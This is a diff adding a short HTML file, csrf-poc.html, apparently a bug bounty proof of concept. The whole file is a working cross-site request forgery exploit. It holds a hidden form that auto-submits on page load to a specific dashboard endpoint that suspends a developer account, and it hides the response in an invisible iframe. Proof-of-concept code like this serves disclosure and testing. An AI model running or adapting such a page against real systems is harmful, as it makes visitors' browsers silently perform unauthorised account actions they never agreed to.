@@ -1,0 +1,17 @@
+<!-- csrf-poc.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <form action="https://bug-bounty-dashboard.k8s.tools-001.d-use-1.braze-dev.com/companies/67f7d3bb775cea006358de5d/developers/67fb60eabffdd6006eda8b8a/suspend" method="POST" target="hiddenFrame">
+      <!-- Empty body because it’s not needed -->
+    </form>
+
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
+
+    <script>
+      // Auto-submit the form on load
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
+
